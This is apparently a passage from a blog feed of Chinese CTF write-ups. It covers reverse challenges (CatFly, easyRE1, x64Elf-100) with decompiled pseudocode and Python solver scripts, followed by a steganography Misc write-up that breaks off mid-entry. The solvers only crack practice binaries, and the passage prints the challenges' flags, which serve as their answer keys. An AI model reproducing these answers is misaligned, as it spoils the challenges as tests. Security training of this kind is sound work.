class="built_in">printf</span>(<span class="string">&quot;                TERM=fallback telnet ...&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        Or on Windows:&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                telnet -t vtnt ...&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        Problems? Check the website:&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                \x1B[1;34mhttp://nyancat.dakko.us\x1B[0m&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        This is a telnet server, remember your escape keys!&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;                \x1B[1;31m^]quit\x1B[0m to exit&quot;</span>);</span><br><span class="line">      sub_65E2(<span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;        Starting in %d...                \n&quot;</span>, v14 - j);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      usleep(<span class="number">0x61A80u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[u&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H\x1B[2J\x1B[?25l&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  time(&amp;timer);</span><br><span class="line">  v13 = <span class="number">1</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v12 = off_FA88;</span><br><span class="line">  <span class="keyword">while</span> ( v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_E104 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\x1B[H&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\x1B[u&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( k = dword_E1EC; k &lt; dword_E1F0; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( m = dword_E1F4; m &lt; dword_E1F8; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( k &lt;= <span class="number">23</span> || k &gt; <span class="number">42</span> || m &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( m &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)k &lt; <span class="number">0x40</span> &amp;&amp; m &lt;= <span class="number">63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v19 = off_FA20[v24][k][m];</span><br><span class="line">            off_FA88 = (<span class="type">char</span> *)sub_6314((<span class="type">unsigned</span> <span class="type">int</span>)v24, (<span class="type">unsigned</span> <span class="type">int</span>)k, (<span class="type">unsigned</span> <span class="type">int</span>)m, v12);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v19 = <span class="number">44</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v18 = (<span class="number">2</span> - m) % <span class="number">16</span> / <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ((v24 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            v18 = <span class="number">1</span> - v18;</span><br><span class="line">          s[<span class="number">128</span>] = <span class="string">&quot;,,&gt;&gt;&amp;&amp;&amp;+++###==;;;,,&quot;</span>;</span><br><span class="line">          v19 = asc_BFE3[v18 - <span class="number">23</span> + k];</span><br><span class="line">          <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            v19 = <span class="number">44</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v25 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_FCC0 + v19));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v19 == v22 || !*((_QWORD *)&amp;unk_FCC0 + v19) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, off_FA88);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v22 = v19;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s%s&quot;</span>, *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_FCC0 + v19), off_FA88);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_65E2(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( dword_E100 )</span><br><span class="line">    &#123;</span><br><span class="line">      time(&amp;time1);</span><br><span class="line">      v11 = difftime(time1, timer);</span><br><span class="line">      v10 = sub_63FF((<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">int</span>)v11);</span><br><span class="line">      <span class="keyword">for</span> ( n = (dword_E1FC - <span class="number">29</span> - v10) / <span class="number">2</span>; n &gt; <span class="number">0</span>; --n )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      dword_E1E8 += <span class="built_in">printf</span>(<span class="string">&quot;\x1B[1;37mYou have nyaned for %d times!\x1B[J\x1B[0m&quot;</span>, ++dword_108E0);</span><br><span class="line">    &#125;</span><br><span class="line">    v22 = <span class="number">0</span>;</span><br><span class="line">    ++v23;</span><br><span class="line">    <span class="keyword">if</span> ( dword_104C4 &amp;&amp; v23 == dword_104C4 )</span><br><span class="line">      sub_6471();</span><br><span class="line">    <span class="keyword">if</span> ( !off_FA20[++v24] )</span><br><span class="line">      v24 = <span class="number">0</span>;</span><br><span class="line">    usleep(<span class="number">1000</span> * v27);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这一部分，<code>printf(&quot;%s&quot;, off_FA88);</code>这里我们进一步跟进 <code>off_FA88</code><br>看到了对它的赋值操作 <code>off_FA88 = sub_6314((unsigned int)v24, k, m, (__int64)v12);</code><br>此时我们查看<code>sub_6314</code>的源代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( m &gt;= <span class="number">0</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)k &lt; <span class="number">0x40</span> &amp;&amp; m &lt;= <span class="number">63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v19 = off_FA20[v24][k][m];</span><br><span class="line">            off_FA88 = (<span class="type">char</span> *)sub_6314((<span class="type">unsigned</span> <span class="type">int</span>)v24, (<span class="type">unsigned</span> <span class="type">int</span>)k, (<span class="type">unsigned</span> <span class="type">int</span>)m, v12);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v19 = <span class="number">44</span>;</span><br></pre></td></tr></table></figure><p>以下是<code>sub_6314</code>的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_6314</span><span class="params">(__int64 a1, <span class="type">int</span> a2, <span class="type">int</span> a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">18</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)a4;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">4</span> || a3 &gt; <span class="number">54</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)a4;</span><br><span class="line">  byte_104C9 = <span class="number">32</span>;</span><br><span class="line">  dword_E120[a3 - <span class="number">5</span>] ^= sub_62B5();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_62E3(dword_E120[a3 - <span class="number">5</span>]) )</span><br><span class="line">    byte_104C8 = dword_E120[a3 - <span class="number">5</span>] &amp; <span class="number">0x7F</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    byte_104C8 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">return</span> &amp;byte_104C8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_62B5</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_62B5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  dword_E1E8 = <span class="number">1103515245</span> * dword_E1E8 + <span class="number">12345</span>;</span><br><span class="line">  <span class="keyword">return</span> (dword_E1E8 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_62E3</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_62E3</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 &amp; <span class="number">0x7Fu</span>) &lt;= <span class="number">0x7E</span> &amp;&amp; (a1 &amp; <span class="number">0x7Fu</span>) &gt; <span class="number">0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>dword_E120</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">000000000000E120</span> dword_E120      dd <span class="number">27F</span>Bh, <span class="number">27</span>A4h, <span class="number">464</span>Eh, <span class="number">0E36</span>h, <span class="number">7B</span>70h, <span class="number">5E7</span>Ah, <span class="number">1</span>A4Ah, <span class="number">45</span>C1h</span><br><span class="line">.data:<span class="number">000000000000E120</span>                                         ; DATA XREF: sub_6314+<span class="number">5</span>C↑o</span><br><span class="line">.data:<span class="number">000000000000E120</span>                                         ; sub_6314+<span class="number">7</span>A↑o ...</span><br><span class="line">.data:<span class="number">000000000000E140</span>                 dd <span class="number">2B</span>DFh, <span class="number">23B</span>Dh, <span class="number">3</span>A15h, <span class="number">5B</span>83h, <span class="number">1E15</span>h, <span class="number">5367</span>h, <span class="number">50B</span>8h, <span class="number">20</span>CAh</span><br><span class="line">.data:<span class="number">000000000000E160</span>                 dd <span class="number">41F</span>5h, <span class="number">57</span>D1h, <span class="number">7750</span>h, <span class="number">2</span>ADFh, <span class="number">11F</span>8h, <span class="number">9B</span>Bh, <span class="number">5724</span>h, <span class="number">7374</span>h</span><br><span class="line">.data:<span class="number">000000000000E180</span>                 dd <span class="number">3</span>CE6h, <span class="number">646</span>Eh, <span class="number">10</span>Ch, <span class="number">6E10</span>h, <span class="number">64F</span>4h, <span class="number">3263</span>h, <span class="number">3137</span>h, <span class="number">0B</span>8h</span><br><span class="line">.data:<span class="number">000000000000E1</span>A0                 dd <span class="number">229</span>Ch, <span class="number">7B</span>CDh, <span class="number">73B</span>Dh, <span class="number">480</span>Ch, <span class="number">14</span>DBh, <span class="number">68B</span>9h, <span class="number">5</span>C8Ah, <span class="number">1B</span>61h</span><br><span class="line">.data:<span class="number">000000000000E1</span>C0                 dd <span class="number">6</span>C59h, <span class="number">5707</span>h, <span class="number">9E6</span>h, <span class="number">1F</span>B9h, <span class="number">2</span>AD3h, <span class="number">76</span>D4h, <span class="number">3113</span>h, <span class="number">7</span>C7Eh</span><br><span class="line">.data:<span class="number">000000000000E1</span>E0                 dd <span class="number">11E0</span>h, <span class="number">6</span>C70h</span><br></pre></td></tr></table></figure><p>结合上述思路，那么可以发现这个程序应该逆向的顺序为:</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">off_FA88-&gt;dword_<span class="number">108E0</span>-&gt;dword_E<span class="number">1E8</span></span><br></pre></td></tr></table></figure><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dword_E1E8 = <span class="number">0x1106</span></span><br><span class="line">dword_E120 = [</span><br><span class="line">    <span class="number">0x27fb</span>, <span class="number">0x27a4</span>, <span class="number">0x464e</span>, <span class="number">0x0e36</span>, <span class="number">0x7b70</span>, <span class="number">0x5e7a</span>, <span class="number">0x1a4a</span>, <span class="number">0x45c1</span>,</span><br><span class="line">    <span class="number">0x2bdf</span>, <span class="number">0x23bd</span>, <span class="number">0x3a15</span>, <span class="number">0x5b83</span>, <span class="number">0x1e15</span>, <span class="number">0x5367</span>, <span class="number">0x50b8</span>, <span class="number">0x20ca</span>,</span><br><span class="line">    <span class="number">0x41f5</span>, <span class="number">0x57d1</span>, <span class="number">0x7750</span>, <span class="number">0x2adf</span>, <span class="number">0x11f8</span>, <span class="number">0x09bb</span>, <span class="number">0x5724</span>, <span class="number">0x7374</span>,</span><br><span class="line">    <span class="number">0x3ce6</span>, <span class="number">0x646e</span>, <span class="number">0x010c</span>, <span class="number">0x6e10</span>, <span class="number">0x64f4</span>, <span class="number">0x3263</span>, <span class="number">0x3137</span>, <span class="number">0x00b8</span>,</span><br><span class="line">    <span class="number">0x229c</span>, <span class="number">0x7bcd</span>, <span class="number">0x73bd</span>, <span class="number">0x480c</span>, <span class="number">0x14db</span>, <span class="number">0x68b9</span>, <span class="number">0x5c8a</span>, <span class="number">0x1b61</span>,</span><br><span class="line">    <span class="number">0x6c59</span>, <span class="number">0x5707</span>, <span class="number">0x09e6</span>, <span class="number">0x1fb9</span>, <span class="number">0x2ad3</span>, <span class="number">0x76d4</span>, <span class="number">0x3113</span>, <span class="number">0x7c7e</span>,</span><br><span class="line">    <span class="number">0x11e0</span>, <span class="number">0x6c70</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_62B5</span>():</span><br><span class="line">    <span class="keyword">global</span> dword_E1E8</span><br><span class="line">    dword_E1E8 = (<span class="number">1103515245</span> * dword_E1E8 + <span class="number">12345</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> (dword_E1E8 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x7FFF</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">llog</span>(<span class="params">n</span>):</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt;= <span class="number">10</span>:</span><br><span class="line">        n //= <span class="number">10</span></span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_62E3</span>(<span class="params">a1</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x7E</span> &gt;= (a1 &amp; <span class="number">0x7F</span>) &gt; <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        dword_E120[i] ^= sub_62B5()</span><br><span class="line"> </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    dword_E1E8 += <span class="number">42</span> + llog(count)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> count % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Count: <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    flag = <span class="built_in">bytearray</span>(<span class="number">51</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sub_62E3(dword_E120[i]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag[i] = dword_E120[i] &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">6</span>] == <span class="string">b&#x27;CatCTF&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Count: <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/Git-Projects/CTF_Challenges/Reverse/CatFly$ python3 exp.py </span><br><span class="line">Count: 1000000</span><br><span class="line">Count: 2000000</span><br><span class="line">Count: 3000000</span><br><span class="line">Count: 4000000</span><br><span class="line">Count: 5000000</span><br><span class="line">Count: 6000000</span><br><span class="line">Count: 7000000</span><br><span class="line">Count: 8000000</span><br><span class="line">Count: 9000000</span><br><span class="line">Count: 10000000</span><br><span class="line">Count: 11000000</span><br><span class="line">Count: 12000000</span><br><span class="line">Count: 13000000</span><br><span class="line">Count: 14000000</span><br><span class="line">Count: 15000000</span><br><span class="line">Count: 16000000</span><br><span class="line">Count: 17000000</span><br><span class="line">Count: 18000000</span><br><span class="line">Count: 19000000</span><br><span class="line">Count: 20000000</span><br><span class="line">Count: 21000000</span><br><span class="line">Count: 22000000</span><br><span class="line">Count: 23000000</span><br><span class="line">Count: 24000000</span><br><span class="line">Count: 25000000</span><br><span class="line">Count: 26000000</span><br><span class="line">Count: 27000000</span><br><span class="line">Count: 28000000</span><br><span class="line">Count: 29000000</span><br><span class="line">Count: 30000000</span><br><span class="line">Count: 31000000</span><br><span class="line">Count: 32000000</span><br><span class="line">Count: 33000000</span><br><span class="line">Count: 34000000</span><br><span class="line">Count: 35000000</span><br><span class="line">Count: 36000000</span><br><span class="line">Count: 37000000</span><br><span class="line">Count: 38000000</span><br><span class="line">Count: 39000000</span><br><span class="line">Count: 40000000</span><br><span class="line">Count: 41000000</span><br><span class="line">Count: 42000000</span><br><span class="line">Count: 43000000</span><br><span class="line">Count: 44000000</span><br><span class="line">Count: 45000000</span><br><span class="line">Count: 46000000</span><br><span class="line">Count: 47000000</span><br><span class="line">Count: 48000000</span><br><span class="line">Count: 49000000</span><br><span class="line">Count: 50000000</span><br><span class="line">Count: 51000000</span><br><span class="line">Count: 52000000</span><br><span class="line">Count: 53000000</span><br><span class="line">Count: 54000000</span><br><span class="line">Count: 55000000</span><br><span class="line">Count: 56000000</span><br><span class="line">Count: 57000000</span><br><span class="line">Count: 58000000</span><br><span class="line">Count: 59000000</span><br><span class="line">Count: 60000000</span><br><span class="line">Count: 61000000</span><br><span class="line">Count: 62000000</span><br><span class="line">Count: 63000000</span><br><span class="line">Count: 64000000</span><br><span class="line">Count: 65000000</span><br><span class="line">Count: 66000000</span><br><span class="line">Count: 67000000</span><br><span class="line">Count: 68000000</span><br><span class="line">Count: 69000000</span><br><span class="line">Count: 70000000</span><br><span class="line">Count: 71000000</span><br><span class="line">Count: 72000000</span><br><span class="line">Count: 73000000</span><br><span class="line">Count: 74000000</span><br><span class="line">Count: 75000000</span><br><span class="line">Count: 76000000</span><br><span class="line">Count: 77000000</span><br><span class="line">Count: 78000000</span><br><span class="line">Count: 79000000</span><br><span class="line">Count: 80000000</span><br><span class="line">Count: 81000000</span><br><span class="line">Count: 82000000</span><br><span class="line">Count: 83000000</span><br><span class="line">Count: 84000000</span><br><span class="line">Count: 85000000</span><br><span class="line">Count: 86000000</span><br><span class="line">Count: 87000000</span><br><span class="line">Count: 88000000</span><br><span class="line">Count: 89000000</span><br><span class="line">Count: 90000000</span><br><span class="line">Count: 91000000</span><br><span class="line">Count: 92000000</span><br><span class="line">Count: 93000000</span><br><span class="line">Count: 94000000</span><br><span class="line">Count: 95000000</span><br><span class="line">Count: 96000000</span><br><span class="line">Count: 97000000</span><br><span class="line">Count: 98000000</span><br><span class="line">Count: 99000000</span><br><span class="line">Count: 100000000</span><br><span class="line">CatCTF&#123;Fly1NG_NyAnC4t_Cha5eS_the_FL4G_in_The_Sky&#125;</span><br><span class="line">Count: 100001958</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easyRE1 Writeup</title>
      <link href="/2025/08/26/adworld-easyRE/"/>
      <url>/2025/08/26/adworld-easyRE/</url>
      
        <content type="html"><![CDATA[<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>拿到附件用IDA打开F5出伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [esp+1Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+11Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is the password?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;the password&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FLAG:db2f62a36a018bce28e46d976e3f9864&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>FLAG: <code>flag&#123;db2f62a36a018bce28e46d976e3f9864&#125;</code></em></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reversing-x64Elf-100 Writeup</title>
      <link href="/2025/08/26/adworld-reversing-x64Elf-100/"/>
      <url>/2025/08/26/adworld-reversing-x64Elf-100/</url>
      
        <content type="html"><![CDATA[<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>拿到附件用<code>file</code>确定一下文件类型得知是<code>64位ELF文件</code>，用<code>IDA</code>分析：</p><p><code>mian</code>函数伪代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4006FD(s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nice!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析上述代码我们可以得知，程序首先定义了一个长度为264位的字符出<code>s</code>，初步分析认为是用于存储程序的输入，往下看大致得知该程序为校验密码，跳转到验证函数<code>sub_4006FD</code></p><p>验证函数伪代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4006FD</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  _QWORD v3[<span class="number">4</span>]; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = <span class="string">&quot;Dufhbmf&quot;</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="string">&quot;pG`imos&quot;</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="string">&quot;ewUglpt&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)(v3[i % <span class="number">3</span>] + <span class="number">2</span> * (i / <span class="number">3</span>)) - *(<span class="type">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="string">&quot;Dufhbmf&quot;</span>,<span class="string">&quot;pG`imos&quot;</span>,<span class="string">&quot;ewUglpt&quot;</span>]</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i % <span class="number">3</span>][<span class="number">2</span> * <span class="built_in">int</span>(i / <span class="number">3</span>)])-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Misc-Cat_Jump-Miao合集</title>
      <link href="/2025/08/12/adworld-Misc-Jump-Cat-miao/"/>
      <url>/2025/08/12/adworld-Misc-Jump-Cat-miao/</url>
      
        <content type="html"><![CDATA[<h2 id="Cat-Jump"><a href="#Cat-Jump" class="headerlink" title="Cat_Jump"></a>Cat_Jump</h2><p>直接用vscode打开搜索<code>catctf&#123;</code></p><p><img src="/images/adworld-cat_jump.png" alt="Caught The Flag"></p><h2 id="Miao"><a href="#Miao" class="headerlink" title="Miao~"></a>Miao~</h2><p>附件内容是一张小猫的图片</p><p><img src="/images/adworld-miao-1.jpg" alt="喵~"></p><p>分析图片中隐含的内容，得到一个wav文件</p><p><img src="/images/adworld-miao-2.png" alt="图二展示了使用foremost工具分析图片中隐藏文件及其结果"></p><p>在<code>Audacity</code>中打开，查看频谱图，得到密码CatCTF </p><p><img src="/images/adworld-miao-3.png" alt="图三展示了在Audacity中通过查看频谱图得到密码"></p><p>然后在Deepsound中打开wav文件，得到<code>flag.txt</code></p><p>工具下载地址：<a href="https://github.com/Jpinsoft/DeepSound">Jpinsoft&#x2F;DeepSound: Official DeepSound repository migrated from jpinsoft.net. DeepSound is a freeware steganography tool and audio converter that hides secret data into audio files. The application also enables you to extract secret files directly from audio files or audio CD tracks.</a></p><p><img src="/images/adworld-misc-miao-4.png" alt="图四展示了在Deepsound中提取音频中的隐藏文件"></p><p>文件内容如下</p><figure class="highlight haml"><table><tr><td class="code"><pre><span 